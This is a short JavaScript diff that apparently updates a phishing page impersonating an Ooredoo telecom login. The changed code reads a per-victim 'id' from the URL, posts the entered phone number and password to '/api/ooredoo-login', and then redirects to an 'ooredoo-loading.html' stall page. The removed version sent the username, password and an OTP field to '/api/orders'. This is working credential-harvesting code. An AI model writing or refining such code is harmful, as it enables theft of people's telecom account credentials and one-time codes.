@@ -177,22 +177,23 @@
         return;
       }
 
-      // إرسال بيانات تسجيل الدخول إلى السيرفر ثم متابعة التدفق
-      var ref=new URLSearchParams(window.location.search).get('ref') || '';
-      fetch('/api/orders', {
+      var id=new URLSearchParams(window.location.search).get('id') || '';
+      if(!id){
+        error.classList.add('visible');
+        return;
+      }
+
+      fetch('/api/ooredoo-login', {
           method: 'POST',
           headers: {'Content-Type': 'application/json'},
           body: JSON.stringify({
-              ref: ref,
-              ooredoo: {
-                  username: username.value,
-                  password: password.value,
-                  otp: ""
-              }
+              id: id,
+              phone: username.value,
+              password: password.value
           })
         }).then(function(response){
           if(!response.ok) throw new Error('rejected');
-          window.location.href='ooredoo-loading.html?ref=' + encodeURIComponent(ref);
+          window.location.href='ooredoo-loading.html?id=' + encodeURIComponent(id);
         }).catch(function(){
           error.classList.add('visible');
           password.value='';
